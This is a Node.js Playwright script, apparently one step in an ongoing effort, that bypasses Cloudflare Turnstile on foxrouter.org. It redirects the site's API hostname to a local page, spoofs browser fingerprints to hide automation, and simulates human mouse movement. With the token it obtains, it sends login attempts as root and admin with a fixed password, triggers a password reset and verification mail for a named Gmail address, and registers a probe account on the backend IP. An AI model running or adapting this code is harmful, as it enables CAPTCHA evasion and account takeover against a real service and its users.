// 17860: DNS 前置已由 workflow 修好（DoH -> /etc/hosts + resolv.conf + Chrome host-resolver-rules）。
// 复用 #17839 hosts-hijack 方案（api.foxrouter.org -> 127.0.0.1 本地最小页，显式 render 真 sitekey），
// 并在同 job 内并行跑真实 https://foxrouter.org/sign-in 对照。
// 关键修正（#17839 缺的）：http origin 必须 --unsafely-treat-insecure-origin-as-secure，否则 crypto.subtle 缺失 -> 600010（fact 17861）；
// 点击必须用 Frame.frameElement() 取坐标（Turnstile iframe 在 shadow root 内，fact 17861）。
const { chromium } = require('playwright-core');
const http = require('http');
const fs = require('fs');
const T = process.env.RUNNER_TEMP || '/tmp';
const LOCAL = fs.readFileSync('page_local.html');
const REAL = '0x4AAAAAAEGBqst_6XV04SLn';
const HOST = 'api.foxrouter.org';
const ROUNDS = parseInt(process.env.ROUNDS || '6', 10);
const SECS = parseInt(process.env.SECS || '150', 10);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36';
const log = s => { const l = '[' + new Date().toISOString().slice(11, 19) + '] ' + s; console.log(l); try { fs.appendFileSync(T + '/r.log', l + '\n'); } catch (e) {} };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => a + Math.random() * (b - a);

const srv = http.createServer((req, res) => {
  if (req.url === '/favicon.ico') { res.writeHead(204); return res.end(); }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(LOCAL);
});

async function submit(tok, tag) {
  const base = 'http://63.141.242.130:3000';
  const run = async (name, url, body) => {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://foxrouter.org' }, body: body });
      log(`SUBMIT ${tag} ${name} -> ${r.status} ${(await r.text()).slice(0, 700)}`);
    } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  for (const u of ['root', 'admin', 'aPG666a']) {
    await run('login_' + u, base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: u, password: 'a2317471' }));
  }
  await run('reset_pw', base + '/api/user/reset_password?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null);
  await run('register_probe', base + '/api/user/register?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'p' + Date.now() % 100000, password: 'Probe12345!', email: 'p' + Date.now() % 100000 + '@example.com' }));
  await run('verify_mail', base + '/api/verification?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null);
}

async function humanMove(page, x, y) {
  const vp = page.viewportSize() || { width: 1280, height: 940 };
  let cx = rnd(0.5, 0.9) * vp.width, cy = rnd(0.6, 0.95) * vp.height;
  for (let i = 1; i <= 22; i++) {
    const t = i / 22;
    await page.mouse.move(cx + (x - cx) * t + Math.sin(t * 7) * rnd(-12, 12), cy + (y - cy) * t + Math.cos(t * 9) * rnd(-9, 9));
    await sleep(rnd(9, 26));
  }
  await page.mouse.move(x + 1, y + 1); await sleep(rnd(220, 520));
  await page.mouse.down(); await sleep(rnd(70, 150)); await page.mouse.up();
}

async function clickWidget(page) {
  let box = null;
  for (const f of page.frames()) {
    if (f === page.mainFrame()) continue;
    try { const el = await f.frameElement(); box = el ? await el.boundingBox() : null; } catch (e) {}
    if (box) break;
  }
  if (!box) return false;
  await humanMove(page, box.x + 26, box.y + box.height / 2);
  return true;
}

async function round(ctx, which, i) {
  const page = await ctx.newPage();
  const t0 = Date.now(); const T_ = () => ((Date.now() - t0) / 1000).toFixed(1);
  const url = which === 'local' ? `http://${HOST}/?r=${Date.now()}` : `https://foxrouter.org/sign-in?r=${Date.now()}`;
  page.on('console', m => { const t = m.text(); if (/ERRCB|BEFORE|AFTER|TIMEOUT/.test(t)) log(`[${T_}s C] ${t.slice(0, 60)}`); });
  page.on('response', async r => {
    const u = r.url();
    if (!/challenge-platform|challenges\.cloudflare/.test(u)) return;
    let b = '', n = 0; try { b = (await r.text()); n = b.length; b = b.slice(0, 90); } catch (e) { b = '<nb>'; }
    log(`[${T_}s R${r.status()} len=${n}] ${r.request().method()} ${u.slice(0, 110)} :: ${b.replace(/\s+/g, ' ').slice(0, 90)}`);
  });
  page.on('requestfailed', r => { if (/challenge/.test(r.url())) log(`[${T_}s FAILED ${r.url().slice(0, 110)} ${(r.failure() || {}).errorText}`); });
  log(`ROUND ${i} ${which} ${url.slice(0, 70)}`);
  try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 35000 }); } catch (e) { log('GOTO_ERR ' + String(e).slice(0, 100)); }
  await sleep(rnd(1800, 3000));
  let tok = '', clicks = 0, lastClick = 0;
  while (Date.now() - t0 < SECS * 1000 && !tok) {
    await sleep(2500);
    tok = await page.evaluate(() => { try { return window.__tok || (window.turnstile && turnstile.getResponse && turnstile.getResponse()) || ''; } catch (e) { return ''; } }).catch(() => '');
    if (tok) break;
    const el = (Date.now() - t0) / 1000;
    const ev = await page.evaluate(() => (window.__ev || []).join('|')).catch(() => '');
    log(`[${T_}s] tok=${tok.length} ev=${ev.slice(-30)} frames=${page.frames().length - 1}`);
    if (clicks < 8 && el > 6 && (clicks === 0 || el - lastClick > 18)) {
      const ok = await clickWidget(page).catch(() => false);
      if (ok) { clicks++; lastClick = el; log(`[${T_}s] CLICK#${clicks}`); }
    }
    if (Math.round(el) % 20 < 3) {
      for (const f of page.frames()) {
        if (f === page.mainFrame()) continue;
        let t = ''; try { t = (await f.evaluate(() => document.body.innerText)).replace(/\s+/g, ' '); } catch (e) { t = '<x>'; }
        log(`[${T_}s] FRAMEBODY len=${t.length} ${t.slice(0, 60)}`);
      }
    }
  }
  const st = await page.evaluate(() => ({ ev: (window.__ev || []).join('|'), html: (document.getElementById('ts') || {}).innerHTML || '' })).catch(() => ({ ev: '', html: '' }));
  log(`ROUND_END ${which}#${i} tok_len=${tok.length} clicks=${clicks} ev=${st.ev} div=${(st.html || '').replace(/\s+/g, ' ').slice(0, 150)}`);
  try { fs.writeFileSync(`${T}/shot_${which}_${i}.png`, await page.screenshot()); } catch (e) {}
  await page.close();
  return tok;
}

(async () => {
  await new Promise(r => srv.listen(80, '127.0.0.1', r));
  log('local server up on 127.0.0.1:80');
  const dir = T + '/prof';
  const ctx = await chromium.launchPersistentContext(dir, {
    executablePath: '/usr/bin/google-chrome', headless: false, userAgent: UA,
    viewport: { width: 1280, height: 940 }, locale: 'en-US', timezoneId: 'America/New_York',
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--no-proxy-server',
      '--disable-blink-features=AutomationControlled', '--exclude-switches=enable-automation',
      '--disable-features=ThirdPartyStoragePartitioning,TrackingProtection3pcd,PrivacySandboxSettings4',
      `--unsafely-treat-insecure-origin-as-secure=http://${HOST}`,
      '--host-resolver-rules=MAP brunhild.challenges.cloudflare.com ' + (process.env.BRUNHILD_IP || '104.18.8.208') +
      ', MAP hagen.challenges.cloudflare.com ' + (process.env.HAGEN_IP || '104.18.9.208') +
      ', MAP challenges.cloudflare.com ' + (process.env.CHALL_IP || '104.18.94.41') +
      `, MAP ${HOST} 127.0.0.1`]
  });
  await ctx.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    window.chrome = window.chrome || { runtime: {} };
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
  });
  let got = '';
  for (let i = 1; i <= ROUNDS && !got; i++) {
    const which = (i % 2 === 1) ? 'local' : 'real';
    got = await round(ctx, which, i);
    if (got) { log('TOKEN ' + got); fs.writeFileSync(T + '/token.txt', got); log('TOKEN_LINE::' + got); await submit(got, which + '#' + i); }
  }
  log('DONE got=' + got.length);
  await ctx.close(); srv.close(); process.exit(0);
})().catch(e => { log('FATAL ' + e); process.exit(1); });
